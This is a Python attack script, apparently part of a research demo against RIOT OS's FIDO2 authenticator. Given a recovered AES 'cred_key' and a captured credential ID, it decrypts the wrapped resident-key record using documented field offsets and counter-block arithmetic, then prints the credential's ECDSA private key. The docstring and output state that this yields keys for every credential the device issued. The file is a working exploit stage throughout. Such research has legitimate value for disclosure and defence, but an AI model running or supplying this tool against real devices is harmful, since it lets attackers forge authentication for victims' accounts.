"""What recovering `cred_key` actually buys: the credential's ECDSA private key.

The campaign recovers a 16-byte AES key. This is the step that says why that matters, and
it needs no further device access -- one captured credential ID and the key are enough.

RIOT wraps a `ctap_resident_key` with AES-CCM under `cred_key` and hands the ciphertext to
the platform as the credential ID (`_ctap_encrypt_rk`, `sys/fido2/ctap/ctap.c:1640`). The
record is `__attribute__((packed))` and its header warns that reordering it breaks the
encryption, so the layout is stable:

    offset  0   rp_id_hash[32]      SHA-256 of the relying party's domain
    offset 32   user_id[64]
    offset 96   user_id_len
    offset 97   priv_key[32]        <-- the credential's ECDSA P-256 private key
    offset129   id, sign_count, cred_desc.cred_type

Decryption is CTR with the CCM counter blocks, so plaintext block *i* is
`credId[16i:16i+16] ^ AES(cred_key, A_{i+1})` with `A_j = 0x01 || nonce || j`.

**The check that makes this trustworthy**: `rp_id_hash` must come out equal to
`sha256(rp_id)` for the relying party the credential was made for. That is 32 bytes of
known plaintext the script does not use as input, so if the offsets or the counter
arithmetic were wrong it could not match.

    python demos/fido2_usb/host/unwrap_credential.py \
        --key <recovered hex> --oracle demos/fido2_usb/host/attack_oracle.json
"""
from __future__ import annotations

import argparse
import hashlib
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE / "fast_fido_search"))
from pad4_vector import encrypt  # noqa: E402  -- checked against FIPS-197 C.1

ENC_LEN = 136          # CTAP_CREDENTIAL_ID_ENC_SIZE
NONCE_OFF = 152        # id(136) || mac(16) || nonce(13)
PRIV_OFF, PRIV_LEN = 97, 32
RP_HASH_LEN = 32


def ctr_decrypt(key: bytes, nonce: bytes, ct: bytes) -> bytes:
    out = bytearray()
    for i in range(0, len(ct), 16):
        a = bytes([1]) + nonce + ((i // 16) + 1).to_bytes(2, "big")
        ks = encrypt(key, a)
        blk = ct[i:i + 16]
        out += bytes(x ^ y for x, y in zip(blk, ks))
    return bytes(out)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--key", required=True, help="the recovered cred_key, hex")
    ap.add_argument("--oracle", default=str(HERE / "attack_oracle.json"),
                    help="an oracle file from capture_cred.py; carries the credential id")
    ap.add_argument("--credential-id", default=None, help="hex, instead of --oracle")
    ap.add_argument("--rp-id", default=None, help="for the rp_id_hash check")
    args = ap.parse_args()

    key = bytes.fromhex(args.key)
    if args.credential_id:
        cid, rp_id = bytes.fromhex(args.credential_id), args.rp_id
    else:
        d = json.loads(Path(args.oracle).read_text())
        if "credential_id_hex" not in d:
            raise SystemExit(
                f"{args.oracle} has no credential_id_hex -- it was written by "
                f"make_oracle.py rather than capture_cred.py. Capture one with "
                f"capture_cred.py, or pass --credential-id.")
        cid, rp_id = bytes.fromhex(d["credential_id_hex"]), d.get("rp_id") or args.rp_id

    nonce = cid[NONCE_OFF:NONCE_OFF + 13]
    pt = ctr_decrypt(key, nonce, cid[:ENC_LEN])

    print(f"credential id : {len(cid)} bytes, nonce {nonce.hex()}")
    print(f"rp_id         : {rp_id!r}")
    rp_hash = pt[:RP_HASH_LEN]
    print(f"\ndecrypted rp_id_hash : {rp_hash.hex()}")
    if rp_id:
        want = hashlib.sha256(rp_id.encode()).digest()
        print(f"sha256({rp_id!r}) : {want.hex()}")
        if rp_hash != want:
            print("\n*** MISMATCH -- the decryption is wrong, so nothing below is real. "
                  "Check the key, the nonce offset and the counter arithmetic.")
            return 1
        print("  MATCH -- 32 bytes of known plaintext the script never used as input, "
              "so the decryption is right")

    print(f"\nuser_id_len   : {pt[96]}")
    print(f"user_id       : {pt[32:32 + max(pt[96], 0)].hex() or '(empty)'}")
    print(f"\n*** ECDSA P-256 PRIVATE KEY (offset {PRIV_OFF}, {PRIV_LEN} bytes) ***")
    print(f"    {pt[PRIV_OFF:PRIV_OFF + PRIV_LEN].hex()}")
    print(f"\nid={int.from_bytes(pt[129:131], 'little')} "
          f"sign_count={int.from_bytes(pt[131:135], 'little')}")
    print("\nWhat this means: the private key above signs assertions for that relying "
          "party.\nRecovering one 16-byte AES key yields it for EVERY credential the "
          "device ever\nissued, retrospectively, with no further access to the device.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
